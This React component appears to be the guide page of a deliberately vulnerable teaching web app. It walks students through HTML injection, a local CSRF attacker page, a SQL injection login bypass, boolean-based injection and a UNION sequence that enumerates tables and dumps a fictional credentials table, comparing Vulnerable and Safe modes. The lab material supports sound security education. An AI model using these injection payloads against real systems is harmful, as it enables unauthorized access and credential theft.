import React from 'react';
import Heading from '../components/ui/Heading.jsx';
import Card from '../components/ui/Card.jsx';
const notice = '<div style="padding:18px;background:#fff1c2;color:#664300;border-left:4px solid #cf9800">Demonstration notice: this content came from an untrusted input.</div>';
const stages = [
 ['Column count / valid', "' ORDER BY 3 -- "],
 ['Column count / rejected', "' ORDER BY 4 -- "],
 ['Three-column UNION', "' UNION SELECT NULL,NULL,NULL -- "],
 ['Lab tables', "' UNION SELECT table_schema::text,table_name::text,NULL FROM information_schema.tables WHERE table_schema='public' AND table_name LIKE 'lab_%' -- "],
 ['Credential columns', "' UNION SELECT column_name::text,data_type::text,NULL FROM information_schema.columns WHERE table_schema='public' AND table_name='lab_demo_credentials' -- "],
 ['Fictional records', "' UNION SELECT username::text,demo_secret::text,NULL FROM lab_demo_credentials -- "]
];
export default function SecurityGuide() {
 return <><Heading tag="LEARN / COMPARE / VERIFY" title="Security lab guide" subtitle="Explore real application behavior using only the fictional records in this lab." /><div className="guide-grid">
 <Card><span className="course-code">01 / COURSE SEARCH</span><h3>Reflected content</h3><p>Paste this notice into Course Search. Vulnerable mode renders a notice in the results area; Safe mode displays the markup as text.</p><pre>{notice}</pre></Card>
 <Card><span className="course-code">02 / DISCUSSIONS</span><h3>Persistent content</h3><p>Post the same notice as a message. Refresh to verify persistence from PostgreSQL, then sign in in the other mode to compare rendering.</p><pre>{notice}</pre></Card>
 <Card><span className="course-code">03 / ANNOUNCEMENTS</span><h3>A preview from the URL</h3><p>Paste the notice into the editor and preview. The URL fragment supplies the content entirely in the browser. Compare the notice with literal text in Safe mode.</p></Card>
 <Card><span className="course-code">04 / PROFILE SETTINGS</span><h3>A forged recovery-email update</h3><p>Keep the portal open at <code>http://127.0.0.1:5173</code>, load your profile and open the attacker page below. Submit its form, then refresh the profile. A different port is a different origin but remains the same site, allowing this local cookie demonstration.</p><a href="http://127.0.0.1:4100" target="_blank" rel="noreferrer">Open the local attacker page (new tab)</a><p>The Safe endpoint requires the session CSRF token, which the forged form cannot supply. Start the page with <code>node csrf-attacker/server.js</code>.</p></Card>
 <Card><span className="course-code">05 / SIGN IN</span><h3>Authentication bypass</h3><p>Sign out, select Vulnerable mode and submit this as the email with any nonempty password. A real SQL result creates your session; the dashboard reports whether the credentials actually matched. Repeat in Safe mode to see rejection.</p><pre>{"' OR '1'='1' -- "}</pre></Card>
 <Card><span className="course-code">06 / GRADE AVAILABILITY</span><h3>TRUE and FALSE outcomes</h3><p>Start with <code>CS301</code> (published) and <code>CS302</code> (unpublished). Compare the following course inputs. Safe mode treats each as a literal course code.</p><pre>{"CS301' AND 1=1 -- \nCS301' AND 1=2 -- "}</pre></Card>
 </div><Card className="space-top"><span className="course-code">07 / STUDENT RECORDS</span><h3>From query shape to fictional records</h3><p>Start with <code>23F-1001</code>. Then submit each input below in Student Records. Query errors show column boundaries; successful UNION queries display real lab metadata and fictional demonstration records. Safe mode returns no matches for these inputs.</p>{stages.map(([label,payload]) => <div className="guide-stage" key={label}><b>{label}</b><pre>{payload}</pre></div>)}</Card></>;
}
